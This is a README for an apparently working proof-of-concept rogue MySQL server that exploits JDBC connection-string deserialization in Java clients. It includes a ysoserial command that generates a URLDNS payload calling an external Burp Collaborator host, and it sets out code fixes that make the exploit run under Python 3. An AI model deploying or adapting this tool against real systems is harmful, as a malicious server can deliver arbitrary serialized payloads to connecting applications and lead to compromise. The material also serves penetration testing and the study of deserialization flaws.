# rogue-mysql-server
Modified version of the 'rogue-mysql-server.py' script from https://landgrey.me/blog/11/ to exploit JDBC connection string deserialization. All credit to the original author.

## Usage:

```py
python3 rogue-mysql-server.py
```

## POC Generation w/ ysoserial

```
java -jar ysoserial.jar URLDNS 'http://blahblahblah.burpcollaborator.net' > /tmp/payload.ser
```

## Modifications

Quick reference of the changes that I needed to make in order to get this PoC working from the original blog post.

### File Location

Put the file in `tmp` because why not

```
deserialization_file = r'/tmp/payload.ser'
```

### Float Conversion

Due to this error:

```py
Traceback (most recent call last):
  File "rogue-mysql-server.py", line 102, in <module>
    run_mysql_server()
  File "rogue-mysql-server.py", line 63, in run_mysql_server
    _payload_hex = str(hex(len(deserialization_payload)/2)).replace('0x', '').zfill(4)
TypeError: 'float' object cannot be interpreted as an integer
```

Updated these lines to use `//` to do float division

```py
_payload_hex = str(hex(len(deserialization_payload)//2)).replace('0x', '').zfill(4)
```

```py
_data_hex = str(hex(len(deserialization_payload)//2 + 5)).
```

### String and Byte Concatenation

`deserialization_payload` is raw bytes and needs to be decoded into a `str` before we can concatenate. This is to fix this traceback.

```py
Traceback (most recent call last):
  File "rogue-mysql-server.py", line 102, in <module>
    run_mysql_server()
  File "rogue-mysql-server.py", line 67, in run_mysql_server
    _data += _data_length + '04' + '0131fc' + _payload_length + deserialization_payload
TypeError: can only concatenate str (not "bytes") to str
```

We change

```py
_data += _data_length + '04' + '0131fc' + _payload_length + deserialization_payload
```

to

```py
_data += _data_length + '04' + '0131fc' + _payload_length + deserialization_payload.decode()
```
